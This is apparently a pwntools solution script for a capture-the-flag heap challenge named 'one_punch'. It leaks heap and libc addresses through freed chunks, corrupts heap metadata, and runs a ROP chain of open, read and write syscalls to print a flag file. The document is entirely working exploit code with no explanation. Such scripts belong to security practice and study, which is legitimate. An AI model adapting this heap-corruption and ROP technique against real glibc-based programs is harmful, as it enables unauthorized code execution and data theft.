#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '52.198.120.1'
port = 48763

r = process('./one_punch')

binary = "./one_punch"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc-2.29.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def name(index, name):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)
  pass

def rename(index,name):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)

  pass

def d(index):
  r.recvuntil("> ")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def show(index):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))

def magic(data):
  r.recvuntil("> ")
  r.sendline(str(0xc388))
  time.sleep(0.1)
  r.send(data)

# if len(sys.argv) == 1:
#   r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

# else:
#   r = remote(host ,port)

if __name__ == '__main__':
  name(0,"A"*0x210)
  d(0)
  name(1,"A"*0x210)
  d(1)
  show(1)
  r.recvuntil(" name: ")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x260
  print("heap = {}".format(hex(heap)))
  for i in xrange(5):
    name(2,"A"*0x210)
    d(2)
  name(0,"A"*0x210)
  name(1,"A"*0x210)
  d(0)
  show(0)
  r.recvuntil(" name: ")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0
  print("libc = {}".format(hex(libc)))
  d(1)
  rename(2,p64(libc + 0x1e4c30))

  name(0,"D"*0x90)
  d(0)
  for i in xrange(7):
    name(0,"D"*0x80)
    d(0)
  for i in xrange(7):
    name(0,"D"*0x200)
    d(0)



  name(0,"D"*0x200)
  name(1,"A"*0x210)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)



  d(0)
  d(1)
  name(0,"A"*0x80)
  name(1,"A"*0x80)
  d(0)
  d(1)
  name(0,"A"*0x88 + p64(0x421) + "D"*0x180 )
  name(2,"A"*0x200)
  d(1)
  d(2)
  name(2,"A"*0x200)
  rename(0,"A"*0x88 + p64(0x421) + p64(libc + 0x1e5090)*2 + p64(0) + p64(heap+0x10) )
  d(0)
  d(2)

  pause()
  name(0,"/home/ctf/flag\x00\x00" + "A"*0x1f0)
  magic("A")
  add_rsp48 = libc + 0x000000000008cfd6
  pop_rdi = libc + 0x0000000000026542
  pop_rsi = libc + 0x0000000000026f9e
  pop_rdx = libc + 0x000000000012bda6
  pop_rax = libc + 0x0000000000047cf8
  syscall = libc + 0xcf6c5
  magic( p64(add_rsp48))

  name(0,p64(pop_rdi) + p64(heap + 0x24d0) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) +
      p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall) +
      p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall)
      )
r.interactive()

